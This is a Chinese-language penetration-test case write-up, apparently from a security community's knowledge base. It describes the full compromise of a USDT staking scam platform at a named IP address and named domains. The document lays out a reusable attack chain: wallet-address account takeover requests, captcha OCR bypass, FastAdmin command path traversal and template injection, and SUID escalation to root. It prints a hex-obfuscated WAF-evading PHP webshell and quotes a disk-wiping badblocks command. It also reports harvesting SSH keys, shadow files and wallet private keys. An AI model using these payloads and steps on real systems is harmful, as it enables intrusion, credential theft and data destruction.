# tg-demo61 USDT 质押盘：钱包地址 ATO → FastAdmin RCE → root

- Source: `tg-demo61-渗透测试报告包.zip`（原文留本机案卷，不入库）
- Techniques: fastadmin, thinkphp, wallet-ato, suid, onsite-ledger, chain-verify
- Fused: 2026-10-17 · pack-20261017
- 档: `/root/cases/_absorb/pack_20261017/`

## 目标/资产
- 前台 demo61.trave-ling.com（Vue SPA）；后台 demo61admin.tgbz.qzz.io（FastAdmin）
- Cloudflare 后源站 38.22.89.226（直连 + Host 头回源）
- 业务：多租户“USDT 质押挖矿”投资盘 SaaS；38.22.89.226 同机 115 个站点目录（demo1~63、daikuan、shop、im、tg bot 群）
- CentOS 7.8.2003（kernel 3.10）/ nginx 1.26.2 + 宝塔 WAF / PHP 7.3.31-FPM

## 技术栈与架构
- 前端 Vite + Vue SPA，bundle 内联 API Host、WalletConnect projectId、token 存储 key
- 后端 FastAdmin 1.0.48（ThinkPHP 5.0.x），`/api/{controller}/{action}` 自研会员模块；后台 131 权限节点、33 张业务表
- 数据：MySQL 5.6.51（Docker，宿主 13306 对公网，root@%）；37 库 / 33 业务库，最大 shop 7.9GB / 195 表
- 宝塔面板 15824（root 进程）+ 888 WAF 侧；docker-proxy 8080
- 同机多站同模板，demo61 只是其中一个租户

## 攻击链
1. 回源：查 Cloudflare A 记录得 38.22.89.226，`curl -k -H "Host: <后台域>" https://38.22.89.226/` 直接命中后台登录页
2. 指纹：`/assets/js/require-backend.min.js`、`backend.min.css?v=1.0.48`、`__token__` CSRF、ThinkPHP 原生 404 → FastAdmin 1.0.48
3. 接口面：从 SPA bundle 正则抽 `/api/*`，按 401=控制器存在 / 404=不存在，枚举出 5 控制器 8 个公开动作
4. 未授权读：`POST /api/index/config` 返回收款地址/合约/资金池；`POST /api/index/commission` 无凭据触发结算
5. 账号枚举：`POST /api/user/register_status {"address":...}` 按“未注册/已注册”差异批量枚举全站钱包
6. ATO：`POST /api/user/create` 只按 `fish_address` 查用户，`authorizedAddress` 从不参与校验，地址即身份 → 换 token；实测接管 2 个真实用户
7. 后台登录：`GET /captcha` 取 4 位图 → ddddocr 识别 → 弱口令登入超管 id=1
8. 数据面：`GET /general/config/get_table_list` 拉全表名；`command/get_fields_list?table=` 拉字段；CRUD 列表接口读 33 表
9. 路径穿越：后台在线命令 api 子命令的 `--output` 直接拼 `ROOT_PATH.'public'.DS.$output`，`../` 可穿越
10. RCE：`command/command/action/{command,execute}` 两步先生成再执行 `php think api`；`--title` 注入模板 → 写 PHP 马
11. 提权：`/usr/bin/smash -p -c id`（SUID-root 的 bash 副本，创建于测试当天）→ euid=0
12. 收割：root SSH 私钥、/etc/shadow、宝塔凭据、DB、源码 .git、热钱包私钥、运营台账

## 关键原语/可复用手法
- 控制器枚举：`ffuf -u https://<t>/api/FUZZ -mc all`，401=存在 / 404=不存在，比目录爆破更准
- 钱包登录 ATO：`POST /api/user/create {"address":"<victim>","contract":"<usdt>","type":"erc"}` → `data.token`；根因是只比对公开地址、无签名挑战
- FastAdmin 命令链：先 `action/command` 拿生成结果，再 `action/execute`；`commandtype=api&output=../public/x.php&title=<payload>`
- 无 `$` PHP 马 + WAF 绕过：`<?php echo call_user_func(hex2bin('7368656c6c5f65786563'),hex2bin(getenv('QUERY_STRING')));?>`，既绕 `--title` 的 `$\w+` 剥离，也让宝塔规则只看到 hex；明文命令/路径才会命中
- 验证码：ddddocr(beta) 对 think-captcha 4 位噪声图稳定识别，配合 `__token__` 复用
- SUID 枚举：`find / -perm -4000 -type f 2>/dev/null`；`/usr/bin/smash` 是 bash 副本，`-p` 保 euid
- 链上核验：`eth_getTransactionByHash` 查台账 tx；USDT `balanceOf` eth_call 查地址余额；按合约地址而非 symbol 判币
- Unicode 同形字假币识别：`ꓴS឴DC / Ú5DC / UЅDС / ỤSDC` 等零价值仿冒币，按合约地址比对可拆穿“大额流水”假象

## 数据/战果
- RCE(www) + root + SSH 直登；33 库可读，shop 7.9GB/195 表，demo15 1.7GB
- demo61：35 行用户（真实注册 27，其中已授权 4 / 测试 7 / root 1）；提现 125 笔、收益流水 5209 条、钱包 395、质押 85、管理员日志 3306
- 资金定性：站内收益 482 万 USDT、钱包余额 1539 万、质押本金 135 万，全部为平台自造假账
- 链上实证：历史真实流入约 7.3 万美元等值（USDT 3.28 万 + USDC 4.06 万），当前余额约 1.0004 USDC
- 提现 125 笔中已付 117 笔 / 16,215 USDT；`eth_withdraw_action` 26 笔 transferFrom 台账，抽查 11/11 链上真实
- 热钱包私钥已获取，但该地址 0 USDT/0 USDC，仅 0.000234 ETH gas

## 未攻破面/缺口
- 未动任何资金接口（提现/质押/改余额），DB 仅 SELECT
- 未触碰运维“死手”：ACME 任务内 `pgrep kworker/main || badblocks -fw <root dev>` 根盘破坏逻辑
- 115 个站点仅抽查 demo 系列，未逐站验证同源漏洞（同模板 → 大概率批量存在）
- 后台仅取得超管 id=1 会话；其余后台账号口令未爆出
- `141.98.102.235:7546` 的 10+ 条出站长连接性质未定（疑似 C2/调度）
- 未验证“授权划扣”对真实大户的可操作性（仅 4 个小额测试号）
- 未做内网横向与同 C 段资产扩展

## 敏感物
- 含 2 个后台账号口令、1 个 DB root 口令、1 把 root SSH 私钥、1 份 /etc/shadow
- 含 1 个宝塔口令 + 面板认证密钥、1 个热钱包私钥（明文入库）、1 个 Gitee 仓库地址
- 含 35 行用户/钱包记录与 26 笔链上 tx 台账、115 个站点清单；具体值一律不转载

## 关联

- 伞形：`pentest-execution` / `tgsec-suite`
- 同域其余课见 `domains/crypto-attacks/case-lessons/`

@TGSEC社区 · @TGSEC-Qtzuu 整理
